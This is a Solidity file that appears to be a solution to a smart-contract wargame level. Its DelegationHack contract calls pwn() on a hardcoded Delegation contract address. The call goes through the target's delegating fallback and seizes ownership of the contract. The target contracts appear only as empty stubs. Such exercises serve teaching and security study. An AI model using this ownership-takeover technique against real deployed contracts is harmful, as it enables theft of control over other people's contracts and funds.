pragma solidity ^0.8.0;

import "hardhat/console.sol";

contract Delegate {

  address public owner;

  constructor(address _owner) public {
  }

  function pwn() public {
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {

  }

  fallback() external {
  }
}

contract DelegationHack {

    Delegation dela = Delegation(0x00B4d5891fA4097e1a751A04D9137588A7b3Ef1e);

    constructor(address delegation_addr ) public {
        
        // console.log("Here 1");
        // del = Delegation(delegation_addr);

    }

    function becomeOwner() public returns(bool) {

        // console.log("Owner before");
        // console.log(del.owner());

        // bytes memory payload = abi.encodeWithSignature("pwn()");

        (bool success , bytes memory returnData) = address(dela).call(abi.encodeWithSignature("pwn()"));
        
        return success;
        // console.log("Owner after");
        // console.log(del.owner());
    }

    function returnOwner() public view returns(address){

      return dela.owner();
    }

    function returnSig() public view returns(bytes memory){
      return abi.encodeWithSignature("pwn()");
    }
}